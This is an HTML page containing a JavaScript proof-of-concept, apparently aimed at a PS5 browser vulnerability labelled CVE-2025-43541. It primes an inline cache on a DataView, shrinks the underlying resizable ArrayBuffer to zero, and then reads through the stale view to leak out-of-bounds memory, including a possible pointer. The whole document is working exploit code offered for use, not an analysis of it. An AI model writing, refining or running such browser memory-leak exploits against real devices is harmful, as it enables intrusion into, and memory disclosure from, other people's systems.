<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 CVE-2025-43541 OOB Read Test</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting CVE-2025-43541 optimized test...');

try {
    // 1. Create a resizable ArrayBuffer
    const ab = new ArrayBuffer(1024, { maxByteLength: 4096 });
    
    // 2. Create a DataView over it
    const dv = new DataView(ab, 0, 1024);
    
    // 3. Prime the inline cache (IC) with a small loop, not 282 billion
    const get_byte_length = arr => arr.byteLength;
    for (let i = 0; i < 100; i++) {
        get_byte_length(dv);
    }
    
    L('[*] Initial state:');
    L('  AB byteLength: ' + ab.byteLength);
    L('  DV byteLength: ' + dv.byteLength);
    
    // 4. Resize the ArrayBuffer to 0 to invalidate the backing store
    L('[*] Resizing ArrayBuffer to 0...');
    ab.resize(0);
    
    L('[*] Post-resize state:');
    L('  AB byteLength: ' + ab.byteLength);
    
    // 5. Check if DataView's length was updated
    let dvLen = get_byte_length(dv);
    L('  DV byteLength (via IC): ' + dvLen);
    
    // Also try the original PoC's integer trick
    let intLen = get_byte_length(1);
    L('  Integer byteLength (via IC): ' + intLen);
    
    // 6. Attempt to read out-of-bounds memory
    L('[*] Attempting OOB reads...');
    
    try {
        let val1 = dv.getUint32(0);
        L('[!] READ SUCCESS at offset 0: 0x' + (val1 >>> 0).toString(16));
        
        let val2 = dv.getUint32(4);
        L('[!] READ SUCCESS at offset 4: 0x' + (val2 >>> 0).toString(16));
        
        // Try to read a potential pointer (8 bytes)
        let high = dv.getUint32(8);
        let low = dv.getUint32(12);
        L('[!] READ SUCCESS at offset 8-12: 0x' + (high >>> 0).toString(16) + (low >>> 0).toString(16));
        
        L('[+] If values are not 0, we have an OOB info leak!');
    } catch (e) {
        L('[!] OOB Read failed: ' + e.message);
    }
    
} catch(e) {
    L('[!] Error during setup: ' + e.message);
}

L('[*] Test finished.');
</script>
</body>
</html>
